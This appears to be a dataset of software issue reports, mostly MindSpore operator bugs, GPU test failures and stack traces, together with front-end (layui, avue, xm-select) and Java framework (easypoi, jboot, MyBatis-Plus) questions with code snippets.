Includes preprocessor macro info. (gdb) info macro WHERE The symbol `WHERE' has no definition as a C/C++ preprocessor macro at xx/AST0121-Macro/Macro.c:6 (gdb) info macro __FILE__ Defined at xx/AST0121-Macro/Macro.c:-1 #define __FILE__ ""xx/AST0121-Macro/Macro.c"""
【众智】【计算-GPU开发】SparseSegmentMeanWithNumSegments,"计算张量稀疏段的均值类似SparseSegmentMean，但允许在segment_ids中缺失id。如果缺少 id，则该位置的输出张量将为零。 接口目录：mindspore/ops/operations/sparse_ops.py x indices segment_ids num_segments y 对应底层算子 Classify Name Type Type Range Required Doc Default INPUT x float16,float32,float64 TRUE INPUT indices int32,int64 TRUE 1-D 张量. rank和segment_ids一致. INPUT segment_ids int32,int64 TRUE 1-D 张量. 数值经过排序，运行有重复. INPUT num_segments int32,int64 TRUE 应该等于不同segment_ids的数量. OUTPUT y float16,float32,float64 TRUE 标杆接口参考 TF接口： tf.raw_ops.SparseSegmentMeanWithNumSegments https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/SparseSegmentMeanWithNumSegments 3. 异常处理 4. 算子反向 参考TF算子SparseSegmentMeanWithNumSegments的反向 tensorflow\python\ops\math_grad.py @ops.RegisterGradient(""SparseSegmentMeanWithNumSegments"")   <code>: class SparseSegmentMeanWithNumSegments(Primitive):"
ADPCM格式的音频无法播放,"请问，我这个音频文件是从其他设备传过来的，经过了ADPCM编码的，现在无法在系统上播放 其中playvideo为文件路径，audioType为文件类型，路径正常，类型正常，无报错，但是音频文件就是无法播放，查看属性，他是ADPCM格式的!请教大佬怎么解决，网上说可以用ffmpeg，但是我查到的只是用cmd命令去转换，怎么用代码去实现这个转换呢 其他的不是这个ADPCM编码格式的音频文件能正常播放   <code>: &lt;audio width=""100%"" controls autoplay id=""audio"" ref=""audio"" :src=""playvideo"":type=""audioType""&gt;/audio&gt;"
SIGFPE occurs when training model,"The full interruption stack is: Reproduction is not easy.   <code>: *** Aborted at 1511858223 (unix time) try ""date -d @1511858223"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGFPE (@0x7f0c1d3f36f9) received by PID 41 (TID 0x7f0c66e2e700) from PID 490682105; stack trace: *** @ 0x7f0c6680b390 (unknown) @ 0x7f0c1d3f36f9 paddle::GpuVectorT&lt;&gt;::getAbsMax() @ 0x7f0c1d72acb6 paddle::OptimizerWithGradientClipping::update() @ 0x7f0c1d711625 paddle::SgdThreadUpdater::updateImpl() @ 0x7f0c1d5ce631 ParameterUpdater::update() @ 0x7f0c1d170c26 _wrap_ParameterUpdater_update @ 0x4cb45e PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca8d1 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca099 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca099 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca8d1 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca8d1 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4c2509 PyEval_EvalCode @ 0x4f1def (unknown) @ 0x4ec652 PyRun_FileExFlags @ 0x4eae31 PyRun_SimpleFileExFlags @ 0x49e14a Py_Main @ 0x7f0c66450830 __libc_start_main @ 0x49d9d9 _start @ 0x0 (unknown)"
Tensor索引取值不正确,": /device gpu /device cpu : -- MindSpore version : 1.2.0 -- Python version : Python 3.7.6 -- OS platform and distribution : Linux version 4.19.36-vhulk1907.1.0.h619.eulerosv2r8.aarch64 -- GCC/Compiler version : gcc version 7.3.0 (GCC) run the code showed below, gt_hflip and ms_hflip are not equal.   <code>: from mindspore import Tensor import numpy as np img = np.array(list(range(12))).reshape(1,3,2,2) # 2*2 nchw img gt_hflip = img[:,:,:,::-1] ms_hflip = Tensor(img)[:,:,:,::-1] print(""img = "", img) print(""gt_hflip = "",gt_hflip) print(""ms_hflip = "",ms_hflip)"
表单column默认值value属性无效,根据avue的crud组件文档： Column Attributes的value描述，其应为当字段不存在时的默认值。 然而在实际使用过程中，发现该值并未发生作用，翻阅源码后找到了这个值的使用位置： 翻译：获取数据中prop字段或value字段对应的值。 而根据文档所属，应该是获取数据中prop字段对应的值，当其为空时，获取value值。 所以，正确的写法应当是：   <code>: https://avuejs.com/doc/crud/crud-doc src/core/detail.js line 5 let result = row[column.prop || column.value]; let result = row[column.prop] || column.value;
NCCL compile option set to specific GPU,"https://gitee.com/mindspore/mindspore/blob/master/cmake/external_libs/nccl.cmake#L15 should be either removed, or dynamically detected during compile time.   <code>: NVCC_GENCODE=""-gencode=arch=compute_70,code=sm_70"""
Route [shoukuan.edit] not defined.,"基础信息 请知晓 chemex 通过版本滚动发布，所有帮助请求仅对最新版本有效，因此在反馈问题之前请务必先升级至最新版，并进行测试复现。 版本号： ""dcat/laravel-admin"": ""^2.0"", 问题描述：Controller中使用了 $grid-&gt;column(""_id"", ""收款记录"")-&gt;expand(ApplyOfOrders::make()); ApplyOfOrders=》代码如下 其中使用了route('shoukuan.edit', $applyForOrderModel-&gt;id) class ApplyOfOrders extends LazyRenderable { public function render() { Admin::script($this-&gt;script()); $id = $this-&gt;key; $applyForOrders = HsOrder::all(); $applyForOrders-&gt;transform(function (HsOrder $applyForOrderModel, int $key) { $showBtn = 'yes'; return [ $key + 1, ""$applyForOrderModel-&gt;order_no"", // ApplyForOrderModel::REVIEW_STATUS[$applyForOrderModel-&gt;review_status], $applyForOrderModel-&gt;created_at, $applyForOrderModel-&gt;created_at, ]; }); JS; } } 复现步骤： 截图（可选）：   <code>: $titles = [ '序号', '单号', '状态', '创建时间', ]; return Table::make($titles, $applyForOrders-&gt;toArray()); } public function script() { return &lt;&lt;&lt;'JS' $("".edit-apply-of-order"").on(""click"",function(){ var action = $(this).data('action'); var show_btn = $(this).data('show-btn'); var option = { title:'收款', type: 2, area: ['65%', '80%'], //宽高 content:[action], scrollbar:false, // maxmin:true, end: function(){ if (show_btn == ""yes"") { Dcat.reload(); } }, }; if (show_btn == 'yes') { option.btn = ['保存']; option.btn1 = function(index, layero){ var orderInfo = $('#layui-layer-iframe'+index).contents().find('.content .row:eq(0) .col-md-12:eq(0) form:eq(0)'); var url = orderInfo.attr('action'); Dcat.NP.start(); $.ajax({ type: ""POST"", dataType: ""json"", url: url ,//url data: orderInfo.serialize(), success: function (data) { if (data.status) { Dcat.success(data.message); } else { Dcat.error(data.message); } }, error : function(a,b,c) { Dcat.handleAjaxError(a, b, c); }, complete:function(a,b) { Dcat.NP.done(); } }); layer.close(index); }; } layer.open(option) });"
layedit编辑器的两个优化问题【解决方案】,"layedit当做轻量编辑器还是可以的，比如评论的提交form表单。 但是他有两个地方需要修改，一个是需要验证表单才可以同步textarea，这个比较麻烦 我觉得没有必要在提交的时候，再去写多余的部分代码， 所以你可以在源代码中用以下方案解决 增加一个鼠标移出方案，然后自动去同步到textarea就行了， == 另外一个是表单插入代码的功能，代码在 这里并没有做代码的转义处理，当然你也可以在服务端去处理，但是还是修复的好； 以上修复已经应用在了swiftadmin极速开发框架里面，   <code>: // 监听数据信息的改变 // 利用鼠标移出事件 body.on('mouseout',function(e) { edit.sync(edit.index); }) //插入代码 ,code: function(range){ code.call(body, function(pre){ insertInline.call(iframeWin, 'pre', { text: pre.code ,'lay-lang': pre.lang }, range); }); } ,code: function(range) { code.call(body, function(pre){ insertInline.call(iframeWin, 'pre', { text: ""&lt;code class=\""language-""+ pre.lang.toLowerCase() +"" hljs\""&gt;"" + util.escape(pre.code) + ""&lt;/code&gt;"" }, range); }); }"
弹出层点击确定后提交原页面表单,"想做的效果是   <code>: &lt;form id=""bidding"" class=""col-sm-4""&gt; &lt;h4&gt;你的拍卖&lt;/h4&gt; &lt;!-- 竞拍价格 --&gt; &lt;div class=""form-group""&gt; &lt;label for=""bid-amount""&gt;输入竞拍价&lt;/label&gt; &lt;input type=""text"" class=""form-control"" name=""bid-amount"" id=""bid-amount"" placeholder=""数额大于起拍价"" required=""required""&gt; &lt;/div&gt; &lt;!-- 发送的ETH --&gt; &lt;div class=""form-group""&gt; &lt;label for=""bid-send-amount""&gt;输入要发送的金额&lt;/label&gt; &lt;input type=""text"" class=""form-control"" name=""bid-send-amount"" id=""bid-send-amount"" placeholder=""数额大于竞拍价"" required=""required""&gt; &lt;/div&gt; &lt;!-- 用于加密的text --&gt; &lt;div class=""form-group""&gt; &lt;label for=""secret-text""&gt;输入密钥&lt;/label&gt; &lt;input type=""text"" class=""form-control"" name=""secret-text"" id=""secret-text"" placeholder=""任意字符串"" required=""required""&gt; &lt;/div&gt; &lt;!-- 拍卖产品的id --&gt; &lt;input type=""hidden"" name=""product-id"" id=""product-id"" /&gt; &lt;!-- &lt;button type=""submit"" class=""btn btn-primary"" id=""submitBid""&gt;提交&lt;/button&gt; --&gt; &lt;input class=""btn btn-primary"" id=""input_test"" data-method=""input_submit"" type=""button"" value=""提交""&gt; &lt;/form&gt; layui.use('layer',function(){ var layer = layui.layer; var active = { input_submit: function(){ var bid = document.getElementById(""bid-amount"").value; var send = document.getElementById(""bid-send-amount"").value; var text = document.getElementById(""secret-text"").value; layer.open({ type: 1 ,title: '出价' ,content: '&lt;div style=""padding: 50px; line-height: 22px; background-color: #393D49; color: #fff; font-weight: 300;""&gt;您的竞价为：&lt;br&gt;' + bid + 'ETH&lt;br&gt;&lt;br&gt;您发送的金额为：&lt;br&gt;' + send + 'ETH&lt;br&gt;&lt;br&gt;您输入的密文为：&lt;br&gt;' + text + '&lt;/div&gt;' ,btn: ['确认出价','先不出价'] ,btn1: function(index, layero){ $(""#bidding"").submit(function () { $(""#msg"").hide(); let amount = $(""#bid-amount"").val(); let sendAmount = $(""#bid-send-amount"").val(); let secretText = $(""#secret-text"").val(); let sealedBid = web3js.utils.sha3(web3js.utils.toWei(amount, 'ether') + secretText) let productId = $(""#product-id"").val(); //alert() var sendvalue = web3js.utils.toWei(sendAmount,""ether"") console.log(amount + "" "" + sendvalue+ "" "" + secretText+ "" "" + sealedBid + "" "" +productId); web3js.eth.getAccounts().then(function(i){ var userFrom = i[0].toString(); con.methods.bid(parseInt(productId), sealedBid) .send({ from: userFrom ,value: sendvalue,gas : 6000000}) .on(""receipt"", function(receipt) { $(""#msg"").html(""你的竞价已提交""); $(""#msg"").show(); let productName = $(""#product-name"").text() let endTime = $(""#Endtime"").val() //alert(endTime+productName) $.ajax({ type:""get"", async: false, url:""/addBid"", data:{ ""username"": userFrom, ""productId"": productId, ""productName"": productName, ""EndTime"": endTime } }) }) .on(""error"", function(error) { }); }) //alert() event.preventDefault(); }); layer.closeAll(); } ,btn2: function(index, layero){ layer.closeAll('page'); } }) } }; $('#input_test').on('click', function(){ var othis = $(this), method = othis.data('method'); active[method] ? active[method].call(this, othis) : ''; }); })"
"4.2.0版本中,根据实体类调用createSheet方法导出excel(多sheet导出),如果实体类的被注解属性没有get方法,easypoi会吞掉关键异常","ExcelExportService中createSheet方法 其中这条方法调用链 getAllExcelField -&gt; excelEntity .setMethod(PoiReflectorUtil.fromCache(pojoClass).getGetMethod(field.getName())) -&gt; Method method = getMethods.get(propertyName); if (method == null) throw new RuntimeException( There is no getter for property named '"" + propertyName + ""' in '"" + type 这个地方吐出的RuntimeException被第一段代码createSheet方法catch捕获,但是由于throw new ExcelExportException(ExcelExportEnum.EXPORT_ERROR, e.getCause());的异常再封装,e.getCause()的再一次校验,导致结果为null,也就是丢掉了e的原始异常,放了一个null进去,挺坑的 修复建议 建议以后使用ExcelExportException的这个构造方法的时候一定传入原始异常,至于用不用e.getCause可以在构造器中决定,这样以后即便维护起来,改构造器一处就可以了 我已经提交了PR,如果没有时间的话可以临时先用我的pr,就是把所有的ExcelExportException的这个构造方法使用到e.getCause的地方还原为e,一共有6处位置 加油加油 看到这么方便使用的工具 必须助力一波!   <code>: ... try { List&lt;ExcelExportEntity&gt; excelParams = new ArrayList&lt;ExcelExportEntity&gt;(); // 得到所有字段 Field[] fileds = PoiPublicUtil.getClassFields(pojoClass); ExcelTarget etarget = pojoClass.getAnnotation(ExcelTarget.class); String targetId = etarget == null ? null : etarget.value(); getAllExcelField(entity.getExclusions(), targetId, fileds, excelParams, pojoClass, null, null); //获取所有参数后,后面的逻辑判断就一致了 createSheetForMap(workbook, entity, excelParams, dataSet); } catch (Exception e) { LOGGER.error(e.getMessage(), e); throw new ExcelExportException(ExcelExportEnum.EXPORT_ERROR, e.getCause()); } ..."
多数据源mysql+sqlite 无法使用,"代码如上，下面是jboot.properties配置 http://127.0.0.1/ 访问报错，错误如下 maven pom.xml中引用了sqlite的jar包，mysql的jar包是自带的。   <code>: @RequestMapping(""/"") public class MyController extends JbootController{ public void index() { List&lt;Record&gt; list = Db.use(""a1"").find(""select * from user""); String names = """"; for (Record record : list) { names += record.getStr(""name"")+"" ""; } renderText(""hello jboot!""+list.size()+"",names:""+names); } public static void main(String [] args) { Jboot.run(args); } } jboot.datasource.type=mysql jboot.datasource.url=jdbc:mysql://127.0.0.1:3306/agri_monitor jboot.datasource.user=root jboot.datasource.password=root jboot.datasource.a1.type=sqlite jboot.datasource.a1.url=jdbc:sqlite://agriDB.db 一月 26, 2018 6:53:03 下午 io.jboot.web.handler.JbootActionHandler error 严重: / java.lang.IllegalArgumentException: Config not found by configName: a1 at com.jfinal.plugin.activerecord.Db.use(Db.java:57) at team.savior.infaclient.MyController.index(MyController.java:17) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.jfinal.aop.Invocation.invoke(Invocation.java:73) at io.jboot.web.fixedinterceptor.FixedInvocation.invoke(FixedInvocation.java:46) at io.jboot.component.metric.JbootMetricInterceptor.intercept(JbootMetricInterceptor.java:95) at io.jboot.web.fixedinterceptor.FixedInvocation.invoke(FixedInvocation.java:44) at io.jboot.component.opentracing.OpentracingInterceptor.intercept(OpentracingInterceptor.java:49) at io.jboot.web.fixedinterceptor.FixedInvocation.invoke(FixedInvocation.java:44) at io.jboot.component.shiro.JbootShiroInterceptor.intercept(JbootShiroInterceptor.java:37) at io.jboot.web.fixedinterceptor.FixedInvocation.invoke(FixedInvocation.java:44) at io.jboot.web.controller.validate.ParaValidateInterceptor.intercept(ParaValidateInterceptor.java:47) at io.jboot.web.fixedinterceptor.FixedInvocation.invoke(FixedInvocation.java:44) at io.jboot.web.limitation.LimitationInterceptor.intercept(LimitationInterceptor.java:53) at io.jboot.web.fixedinterceptor.FixedInvocation.invoke(FixedInvocation.java:44) at io.jboot.web.handler.JbootActionHandler.invokeInvocation(JbootActionHandler.java:185) at io.jboot.web.handler.JbootActionHandler.handle(JbootActionHandler.java:88) at io.jboot.web.handler.JbootHandler.doHandle(JbootHandler.java:75) at io.jboot.web.handler.JbootHandler.handle(JbootHandler.java:62) at io.jboot.web.cache.ActionCacheHandler.handle(ActionCacheHandler.java:64) at com.jfinal.core.JFinalFilter.doFilter(JFinalFilter.java:73) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:64) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:131) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:292) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:81) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:138) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:135) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:272) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:81) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:104) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:332) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)"
lambad表达式报错,"当前使用版本 3.4.3   <code>: // 间接推荐的人数 Integer indirectNum = hcxAppUserMapper.selectCount(new LambdaQueryWrapper&lt;HcxAppUser&gt;() .likeRight(HcxAppUser::getInviteFullCode, fulleCode) .gt(hcxAppUser -&gt; hcxAppUser.getInviteCode().length(), fulleCode.length()) ); // 间接推荐的人数 Integer indirectNum = hcxAppUserMapper.selectCount(new LambdaQueryWrapper&lt;HcxAppUser&gt;() .likeRight(HcxAppUser::getInviteFullCode, fulleCode) .gt(hcxAppUser -&gt; hcxAppUser.getInviteCode().length(), fulleCode.length()) ); 2022-08-27 10:48:00 [XNIO-1 task-2] ERROR c.r.f.w.e.GlobalExceptionHandler - nested exception is org.apache.ibatis.builder.BuilderException: Error evaluating expression 'ew.sqlSegment != null and ew.sqlSegment != '' and ew.nonEmptyOfWhere'. Cause: org.apache.ibatis.ognl.OgnlException: sqlSegment [org.apache.ibatis.reflection.ReflectionException: Error parsing property name 'lambda$profit$ea59d8bb$1'. Didn't start with 'is', 'get' or 'set'.] org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.builder.BuilderException: Error evaluating expression 'ew.sqlSegment != null and ew.sqlSegment != '' and ew.nonEmptyOfWhere'. Cause: org.apache.ibatis.ognl.OgnlException: sqlSegment [org.apache.ibatis.reflection.ReflectionException: Error parsing property name 'lambda$profit$ea59d8bb$1'. Didn't start with 'is', 'get' or 'set'.] at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:96) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:441) at com.sun.proxy.$Proxy147.selectOne(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectOne(SqlSessionTemplate.java:160) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:89) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148)"
[CT][MS][OPS]some op have accuracy issues on gpu pynative when dtype=int64,"some op have accuracy issues on gpu pynative / 硬件环境: gpu /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): pynative /mode pynative /mode graph test_indexfill_shape_int64 test_gathernd_x_dtype_int64 test_equalcount_forward_input_int64 test_mirrorpad_input_4d_dtype_int64 test_neg_input_4x8_int64 gpu pyantive pytest -s -v operations/test_indexfill.py::test_indexfill_shape_int64 pytest -s -v operations/test_gathernd.py::test_gathernd_x_dtype_int64 pytest -s -v operations/test_equalcount.py::test_equalcount_forward_input_int64 case pass   <code>: @pytest.mark.parametrize(""size"", [(), (3), (3, 83, 3), (3, 23, 3, 63, 3), (23, 3, 13, 3, 3, 3)]) def test_indexfill_shape_int64(size): low = np.iinfo(np.int8).min high = np.iinfo(np.int8).max dim = 0 indices = Tensor(0, mstype.int32) value = Tensor(255, mstype.int64) x = Tensor(np.random.randint(low, high, size=size), mstype.int64) input_list = [x, dim, indices, value] fact = IndexFillMock(inputs=input_list) &gt; fact.forward_cmp() ../operations/test_indexfill.py:194: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/indexfill_ops.py:124: in forward_cmp allclose_nparray(out_torch, out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([255, -57, 123]), data_me = array([0, 0, 0], dtype=int64) rtol = 0, atol = 0 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[255 -57 123] E data_me_error:[0 0 0] E loss:[255 57 123] ../share/utils.py:24: AssertionError"
Unify `step_block` and `block` to `sub_block`,"In and , the attribute of sub-block is named , while the same thing of the is named . Unifying them can provide us a simple way to determine whether we need to invoke block backward function recursively on this operator. Currently, we are using a set which records all the names of operators of this kind. That's ugly.   <code>: WhileOp RecurrentOp step_block ConditionalBlockOp block"
Controll flow generate AnfNode loop caused memleak.,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run the testcase below and monitor the process used memory.   <code>: import numpy as np import pytest import mindspore.context as context import mindspore.nn as nn from mindspore import Tensor import mindspore.common.dtype as mstype from mindspore.ops import operations as P from mindspore.ops import composite as C import time context.set_context(mode=context.PYNATIVE_MODE, device_target=""CPU"", save_graphs=True, save_graphs_path=""graph_path"") class Net(nn.Cell): def __init__(self, axis=0): super(Net, self).__init__() self.set_grad() self.concat = P.Concat(axis=axis) def construct(self, x1, x2): return self.concat((x1, x2)) class GradNet(nn.Cell): def __init__(self, net): super().__init__() self.net = net self.grad_op = C.GradOperation(get_all=True) def construct(self, x1, x2): gradient_function = self.grad_op(self.net) return gradient_function(x1, x2) # @pytest.mark.level0 # @pytest.mark.platform_arm_ascend_training # @pytest.mark.platform_x86_ascend_training # @pytest.mark.env_onecard # def test_dynamic_concat_cpu(): if __name__ == ""__main__"": net = Net(axis=0) grad_net = GradNet(net) for i in range(1, 1000): x1 = Tensor(np.arange(i), mstype.int32) x2 = Tensor(np.arange(i), mstype.int32) output = grad_net(x1, x2) time.sleep(1)"
同时给两个下拉赋值，第一个tree选中数据，第二个tree未选数据也会选中,"异步返回更新data，同时给两个下拉赋值，第一个下拉框选中数据，第二个下拉框父节点会选中 父节点不选择，可方便选择所有子节点，虽没有影响，但第二个下拉选中项被有影响，不知是不是用的同一个数据源的缘故   <code>: &lt;div id=""demo1"" class=""xm-select-demo""&gt;&lt;/div&gt; &lt;div id=""demo2"" class=""xm-select-demo""&gt;&lt;/div&gt; var demo1 = xmSelect.render({ el: '#demo1', autoRow: true, filterable: true, tree: { show: true, showFolderIcon: true, showLine: true, indent: 20, expandedKeys: [ -3 ], }, toolbar: { show: true, list: ['ALL', 'REVERSE', 'CLEAR'] }, filterable: true, height: 'auto', data: [], }) var demo2 = xmSelect.render({ el: '#demo2', autoRow: true, filterable: true, tree: { show: true, showFolderIcon: true, showLine: true, indent: 20, expandedKeys: [ -3 ], }, toolbar: { show: true, list: ['ALL', 'REVERSE', 'CLEAR'] }, filterable: true, height: 'auto', data: [], //后面更新数据 }) var data1 = [ {name: '销售员', value: -1, children: [ {name: '张三1', value: 1, children: []}, {name: '李四1', value: 2,}, {name: '王五1', value: 3}, ]}, {name: '奖品', value: -2, children: [ {name: '奖品3', value: -3, children: [ {name: '苹果3', value: 14}, {name: '香蕉3', value: 15}, {name: '葡萄3', value: 16}, ]}, {name: '苹果2', value: 4}, {name: '香蕉2', value: 5}, {name: '葡萄2', value: 6}, ]}, ]; var data2 = [ {name: '销售员', value: -1, children: [ {name: '张三1', value: 1, children: []}, {name: '李四1', value: 2,}, {name: '王五1', value: 3}, ]}, {name: '奖品', value: -2, children: [ {name: '奖品3', value: -3, children: [ {name: '苹果3', value: 14}, {name: '香蕉3', value: 15}, {name: '葡萄3', value: 16}, ]}, {name: '苹果2', value: 4}, {name: '香蕉2', value: 5}, {name: '葡萄2', value: 6}, ]}, ]; demo1.update({ data: data1 }); //已解决 采用拷贝方式 ，若不转换下 数据还是会以前的数据导致脏读 var data2 = JSON.parse(JSON.stringify(data1)); //方式二 ：老老实实手动做深度拷贝，自行“勾勒” demo2.update({ data: data2 // 此处使用data1 会出现该问题 });"
【MindSpore】【Ascend】【C类】【semantic_human_matting】训练评估精度不达标,"一、问题现象： 1、进行精度评估： 输出精度结果为：6.9233 训练资料给出的精度标准为：5.4309 实际测试结果与标准相比不达标。 二、软件版本: -- CANN 版本: (CANN 5.0.4 B065) -- Mindspore 版本：1.6.1 --Python 版本:Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04   <code>: bash run_eval.sh 0"
蓝牙BUG,"问题如下： 1.uniapp提供的蓝牙扫描到设备后，拿到的扫描应答包信息ManufacturerData为空，已报BUG,具体可查看：https://ask.dcloud.net.cn/question/109635 2.设备A，设备B B关闭了蓝牙的notify, A 在主动去read的时候，拿不到B蓝牙返回的数据,原生里面是可以有方法获取到的。 设置成功了。但是uni.onBLECharacteristicValueChange(function (characteristic) { console.log('characteristic value comed:', characteristic) }) 收不到回传消息   <code>: uni.notifyBLECharacteristicValueChange({ state: true, // 启用 notify 功能 // 这里的 deviceId 需要已经通过 createBLEConnection 与对应设备建立链接 deviceId:deviceId, // 这里的 serviceId 需要在 getBLEDeviceServices 接口中获取 serviceId:serviceId, // 这里的 characteristicId 需要在 getBLEDeviceCharacteristics 接口中获取 characteristicId:characteristicId, success(res) { console.log('========设置通知监听成功:' + res.errMsg); console.log(JSON.stringify(res)); }"
[CT][MS][ci] reducemax cuDNN Error: cudnnReduceTensor failed,": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_reducemax_input_dtype_flaot64 run testcase def test_reducemax_input_dtype_flaot64(): fact = ReduceMaxFactory(input_shape=(10, 12, 15), axis=1, keep_dims=False, dtype=np.float64) with pytest.raises(TypeError): fact.forward_mindspore_impl() ../operations/test_reducemax.py:281: ../share/ops/reducemax_ops.py:37: in forward_mindspore_impl out = net(input) ../share/utils.py:108: in call out = super().call(*args, **kwargs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:341: in call out = self.compile_and_run(*inputs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:622: in compile_and_run return _executor(self, *new_inputs, phase=self.phase) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:568: in call return self.run(obj, *args, phase=phase) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:596: in run return self._exec_pip(obj, *args, phase=phase_real) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:75: in wrapper results = fn(*arg, **kwargs) self = &lt;mindspore.common.api._Executor object at 0x7fd13ab1c9d0&gt;, obj = WrapOp&lt;&gt; phase = '15train.1614103619431139584' args = (Tensor(shape=[10, 12, 15], dtype=Float64, value= [[[ 4.35914569e-01, -1.01206213e+00, 3.79824642e-01 ... -1.52955823...e-01], [ 3.25063051e-01, -1.88696034e+00, -6.22609194e-01 ... -2.52774035e-01, 1.46843667e+00, 7.01273758e-01]]]),) fn = &lt;bound method ReduceMax.construct of WrapOp&lt;&gt;&gt;, converted = True E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/gpu/arrays/array_reduce_gpu_kernel.h:67 Launch] cuDNN Error: cudnnReduceTensor failed. | Error Number: 9 CUDNN_STATUS_NOT_SUPPORTED pass   <code>: @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct converted, arguments_dict, parse_method = _convert_function_arguments(fn, *args) if not converted: raise RuntimeError('Process method parameter is failure') args_list = tuple(arguments_dict.values()) obj.__parse_method__ = parse_method return self._executor(args_list, phase)"
